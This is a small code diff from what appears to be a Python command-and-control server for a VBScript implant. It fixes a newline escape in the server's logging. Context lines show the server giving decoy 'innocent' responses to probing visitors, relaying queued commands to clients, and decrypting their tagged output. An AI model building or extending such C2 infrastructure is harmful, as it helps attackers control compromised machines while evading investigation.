@@ -97,7 +97,7 @@ class CmdHttpHandler(socketserver.BaseRequestHandler):
                 response = self.innocent_response
                 self.request.sendall(response)
                 with open("investigations.txt", "a") as f:
-                    f.write(f"[{datetime.datetime.now().isoformat()}]{client_ip}:\{self.data}\n------------------")
+                    f.write(f"[{datetime.datetime.now().isoformat()}]{client_ip}:\n{self.data}\n------------------")
                 return
             
             command = client.read_cmd_and_clear().encode('UTF-8')
@@ -122,7 +122,7 @@ class CmdHttpHandler(socketserver.BaseRequestHandler):
                 response = self.innocent_response
                 self.request.sendall(response)
                 with open("investigations.txt", "a") as f:
-                    f.write(f"[{datetime.datetime.now().isoformat()}]{client_ip}:\{self.data}\n------------------")
+                    f.write(f"[{datetime.datetime.now().isoformat()}]{client_ip}:\n{self.data}\n------------------")
                 return
             output: str = "".join(body.split("VBSSIGNATURE")[1].split(":")[2:])
             decrypted_output = encrypt_decrypt(output, ".*!")
